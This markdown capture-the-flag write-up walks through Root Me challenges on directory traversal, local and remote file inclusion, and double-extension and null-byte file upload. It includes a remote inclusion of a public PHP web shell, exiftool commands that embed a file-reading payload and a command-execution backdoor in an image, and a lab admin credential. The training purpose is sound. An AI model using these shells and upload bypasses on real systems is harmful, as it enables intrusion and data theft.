# [Web Application Security Testing](../README.md) -> __Root Me (Directory Traversal, Local File Inclusion, Remote File Inclusion, File Upload Double Extension, File Upload Null Byte)__

- [Web Application Security Testing -\> __Root Me (Directory Traversal, Local File Inclusion, Remote File Inclusion, File Upload Double Extension, File Upload Null Byte)__](#web-application-security-testing---root-me-directory-traversal-local-file-inclusion-remote-file-inclusion-file-upload-double-extension-file-upload-null-byte)
  - [__Root Me (Directory Traversal)__](#root-me-directory-traversal)
  - [__Root Me (Local File Inclusion)__](#root-me-local-file-inclusion)
  - [__Root Me (Remote File Inclusion)__](#root-me-remote-file-inclusion)
  - [__Root Me (File Upload Double Extension)__](#root-me-file-upload-double-extension)
  - [__Root Me (File Upload Null Byte)__](#root-me-file-upload-null-byte)

## __Root Me (Directory Traversal)__

![Directory_Traversal](./res/img/Task_RootMe_DirectoryTraversal.png)

Solution

1. Run the task.

   ![Directory_Traversal](./res/img/RM_dt_001.png)

   Here we see 5 image galleries. The assignment requires us to find a hidden section of the photo gallery.

2. Open any gallery.

   ![Directory_Traversal](./res/img/RM_dt_002.png)

   As we can see, each new gallery opens as an option (*e.g.: `?galerie=emotes`*)

3. Type `../` to move up a level and understand the structure.

   ![Directory_Traversal](./res/img/RM_dt_003.png)

   There is one folder "*`galerie`*" and a file "*`ch15.php`*".

   > __NOTE:__ As we remember, there should be a hidden section inside the gallery.

4. Type `../galerie` to see what sections exist.

   ![Directory_Traversal](./res/img/RM_dt_004.png)

   Here we can see 5 sections known to us and one more ("`86hwnX2r`").

5. Type `../galerie/86hwnX2r/` to view the contents.

   ![Directory_Traversal](./res/img/RM_dt_005.png)

   There are 2 images and one text file named "*password.txt*".

6. Right-click "*password.txt*" and select "*Open link in new tab*".

   ![Directory_Traversal](./res/img/RM_dt_006.png)

7. Go to a new tab.

   ![Directory_Traversal](./res/img/RM_dt_007.png)

8. Collect the "*Flag*".

## __Root Me (Local File Inclusion)__

![Local File Inclusion](./res/img/Task_RootMe_LocalFileInclusion.png)

Solution

1. Run the task.

   ![Local File Inclusion](./res/img/RM_lfi_001.png)

2. Open any tab.

   ![Local File Inclusion](./res/img/RM_lfi_002.png)

   As we can see, each new section tab opens as an option (*e.g.: `?files=coding`*).

3. Open any file from the list.

   ![Local File Inclusion](./res/img/RM_lfi_003.png)

   When selecting any file, the second parameter `?files=coding&=Cheating_elf.pdf` appeared.

4. Type `../` to move up a level and understand the structure.

   ![Local File Inclusion](./res/img/RM_lfi_004.png)

   There are two folders (*"`admin`", "`files`"*) and two files (*"`text.gif`", "`index.php`"*).

   > __IMPORTANT:__
   >
   > While I was looking through the sections and files of the site, no one had a path associated with the "*admin*" and "*files*" folders. We need to take a closer look at what files are there.

   If we try to enter `../` more than once, an error message will appear. This tells us that we are at the highest level.

   ![Local File Inclusion](./res/img/RM_lfi_005.png)

5. Type `../admin/` to see what files exist there.

   ![Local File Inclusion](./res/img/RM_lfi_006.png)

   There is only the file "*index.php*".

6. Click on “*index.php*” and view the content.

   ![Local File Inclusion](./res/img/RM_lfi_007.png)

   We found an array with administrator credentials.

7. Go to the “*admin*” tab at the top right and try logging in as an administrator (*`admin`:`0pbNJ60xYpvAQU8`*).

   ![Local File Inclusion](./res/img/RM_lfi_008.png)

8. The password "__`0pbNJ60xYpvAQU8`__" is "*Flag*".

   ![Local File Inclusion](./res/img/RM_lfi_009.png)

## __Root Me (Remote File Inclusion)__

![Remote File Inclusion](./res/img/Task_RootMe_RemoteFileInclusion.png)

Solution

1. Run the task.

   ![Remote File Inclusion](./res/img/RM_rfi_001.png)

2. Select any language.

   ![Remote File Inclusion](./res/img/RM_rfi_002.png)

   As we can see, each language link is an included file that opens as an option (*e.g.: `?lang=en`*).

3. Type `../` to move up a level and understand the structure.

   ![Remote File Inclusion](./res/img/RM_rfi_003.png)

   An error message will appear. This tells us that we are at the highest level.

4. Let's try to find any web shell source file hosted on any hosts on the Internet (*GitHub, etc.*).

   > __NOTE:__
   >
   > The description below represents a special case, and the difference between the methods described depends on your choice.

5. Use your preferred search engine and enter `php webshell github` (*e.g.: [PHP Webshells Collection](https://github.com/JohnTroony/php-webshells/tree/master/Collection)*).

   ![Remote File Inclusion](./res/img/RM_rfi_004.png)

6. Go to the host where the webshell source file is located.
7. Open it in your browser or copy the link to it without opening it (*for example, just copy this link: [PHP_Shell.php](https://raw.githubusercontent.com/JohnTroony/php-webshells/master/Collection/PHP_Shell.php)*).

   ![Remote File Inclusion](./res/img/RM_rfi_005.png)

8. Paste the copied link into the URL and end the line with a question mark (*`?`*).

   ![Remote File Inclusion](./res/img/RM_rfi_006.png)

9. Press `[Enter]`.

   ![Remote File Inclusion](./res/img/RM_rfi_007.png)

10. Click on the “*==> Haxplorer <==*” area to view the server contents.

    ![Remote File Inclusion](./res/img/RM_rfi_008.png)

    There are 6 service files and 3 PHP source files (*"`en_lang.php`", *"`fr_lang.php`", "`index.php`"*).

11. Click "*index.php*" to view the content.

    ![Remote File Inclusion](./res/img/RM_rfi_009.png)

12. “*Flag*” is in the comment.

## __Root Me (File Upload Double Extension)__

![File Upload Double Extension](./res/img/Task_RootMe_FileUploadDoubleExtension.png)

Solution

1. Run the task.

   ![File Upload Double Extension](./res/img/RM_fude_001.png)

   > __NOTE:__
   >
   > 1. It should be remembered that in the task description we must read the `.passwd` file from the application root folder.
   > 2. There is an "*upload*" tab where we can add an image to the gallery.
   > 3. We need to check if we can send an image containing a web shell.
   > 4. To determine where the uploaded file will be located, we need to upload any image to the gallery.

2. Open the “*upload*” tab and click the "*Upload your photo*" link.

   ![File Upload Double Extension](./res/img/RM_fude_002.png)

3. Browse and select any image to upload.

   ![File Upload Double Extension](./res/img/RM_fude_003.png)

4. Click the `[upload]` button.

   ![File Upload Double Extension](./res/img/RM_fude_004.png)

   As we can see, the uploaded image is located 3 levels below the root (*this is the "ch20" folder*). We need to use the following path `../../../.passwd`.

5. Launch a terminal (*`[Ctrl]`+`[Alt]`+`[T]`*) to change the image using "*exiftool*".
6. Type the following command to add the shell payload.

   ```sh
   exiftool -DocumentName='<?php echo "<pre>This is the Flag {"; system("cat ../../../.passwd"); echo "} </pre>"; ?>' ~/Downloads/image.jpg
   ```

   ![File Upload Double Extension](./res/img/RM_fude_005.png)

   > __ADVANCED:__
   >
   > There are two ways. The first one is intended only for obtaining the "*Flag*", the second one is an online backdoor.
   >
   > Command for the second ways:
   >
   > ```sh
   > exiftool -DocumentName='<?php if(isset($_REQUEST['sh'])){ echo "<pre>"; $sh=($_REQUEST['sh']); system($sh); echo "</pre>"; die; }?>' ~/Downloads/image.jpg
   > ```

7. Enter the following command to rename the image so it can be executed.

   ```sh
   cp ~/Downloads/image.jpg ~/Downloads/image.php.jpg
   ```

   ![File Upload Double Extension](./res/img/RM_fude_006.png)

8. Repeat steps 2 to 4, but in step 3 you need to select the image prepared in step 7 (*image.php.jpg*).

   ![File Upload Double Extension](./res/img/RM_fude_007.png)

9. Click on the link to open uploaded image.

   ![File Upload Double Extension](./res/img/RM_fude_008.png)

10. Collect the "*Flag*".

## __Root Me (File Upload Null Byte)__

![File Upload Null Byte](./res/img/Task_RootMe_FileUploadNullByte.png)

Solution

1. Run the task.

   ![File Upload Null Byte](./res/img/RM_funb_001.png)

2. Open the “*upload*” tab and click the "*Upload your photo*" link.

   ![File Upload Null Byte](./res/img/RM_funb_002.png)

3. Launch a terminal (*`[Ctrl]`+`[Alt]`+`[T]`*)/.
4. Enter the following command to create a new php file with content (*for this task only*).

   ```sh
   cat << EOF > ~/Downloads/null_byte.php%00.jpg
   <?php
   echo "Hello, World!";
   ?>
   EOF
   ```

   ![File Upload Null Byte](./res/img/RM_funb_003.png)

   > __NOTE:__
   >
   > - `%00` - is a null byte which will help us upload the file to the server.

5. Browse and select `null_byte.php%00.jpg` file to upload.

   ![File Upload Null Byte](./res/img/RM_funb_004.png)

6. Click the `[upload]` button.

   ![File Upload Null Byte](./res/img/RM_funb_005.png)

7. Click on the link to open uploaded image.

   ![File Upload Null Byte](./res/img/RM_funb_006.png)

   Of course, we should get a 400 Bad Request error because there is a `%00.jpg` fragment in this link, but the server saves our file without it. Now we only need to remove it from the address bar.

8. Remove the fragment `%00.jpg` from the address bar and press the `[Enter]` button.

   ![File Upload Null Byte](./res/img/RM_funb_007.png)

9. Collect the "*Flag*".
